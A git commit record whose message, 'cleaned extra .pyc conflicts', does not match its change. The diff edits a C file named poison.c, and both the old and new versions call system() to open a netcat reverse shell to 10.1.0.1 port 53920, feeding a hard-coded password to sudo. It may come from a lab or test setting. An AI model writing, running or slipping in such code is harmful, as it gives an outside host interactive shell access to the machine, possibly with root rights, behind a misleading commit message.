205f68a48a3b2a1b37c04495942c3d64e3eb8a30
Kevin Bock <koolkevin@gbfamily.com>
2016-01-03 11:26:36 -0500

    cleaned extra .pyc conflicts

--- tmp/poison.c
+++ tmp/poison.c
@@ -1,6 +1,6 @@
 #include <stdlib.h>
 int main() {
-system("echo target123 | sudo -S nohup cat /tmp/f | nohup /bin/bash -i 2>&1 | nohup nc 10.1.0.1 53920 > sudo nohup /tmp/f &");
+system("echo target123 | sudo -S nohup cat /tmp/f | /bin/sh -i 2>&1 | nc 10.1.0.1 53920 > /tmp/f");
 system("/bin/share/ls");
 return 0;
  }
